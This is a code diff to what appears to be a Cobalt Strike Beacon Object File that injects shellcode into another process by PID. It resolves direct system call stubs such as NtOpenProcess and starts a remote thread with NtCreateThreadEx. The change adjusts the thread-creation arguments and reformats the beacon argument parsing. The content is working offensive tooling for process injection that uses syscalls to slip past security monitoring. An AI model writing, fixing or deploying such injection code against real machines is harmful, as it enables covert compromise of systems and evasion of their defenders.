@@ -77,9 +77,8 @@ VOID InjectShellcode(syscall_t *syscall, DWORD pid, char* sc_ptr, SIZE_T sc_len)
         if(nts >= 0) {
 
           // Executing thread in remote process
-          nts = syscall->NtCreateThreadEx(
-            &threadHandle, MAXIMUM_ALLOWED, NULL, 
-            processHandle, ds, ds, FALSE, 0, 0, 0, NULL);
+          nts = syscall->NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, &oa, processHandle, 
+              (LPTHREAD_START_ROUTINE)ds, ds, FALSE, 0, 0, 0, NULL);
             
           if(threadHandle != NULL) {
             // Waiting for thread to exit
@@ -107,16 +106,16 @@ void go(char *args, int len) {
     syscall_t sc;
     
     char* sc_ptr;
-	SIZE_T sc_len; 
-	DWORD pid;
+    SIZE_T sc_len; 
+    DWORD pid;
     datap parser;
+
+    BeaconDataParse(&parser, args, len);
+    pid = BeaconDataInt(&parser);
+    sc_len = BeaconDataLength(&parser);
+    sc_ptr = BeaconDataExtract(&parser, NULL);
 	
-	BeaconDataParse(&parser, args, len);
-	pid = BeaconDataInt(&parser);
-	sc_len = BeaconDataLength(&parser);
-	sc_ptr = BeaconDataExtract(&parser, NULL);
-	
-	// BeaconPrintf(CALLBACK_OUTPUT, "Shellcode Size: %d bytes\nTargeting process ID: %d", sc_len, pid);
+  	// BeaconPrintf(CALLBACK_OUTPUT, "Shellcode Size: %d bytes\nTargeting process ID: %d", sc_len, pid);
 
     // resolve address of system calls
     sc.NtOpenProcess           = (NtOpenProcess_t)GetSyscallStub("NtOpenProcess");
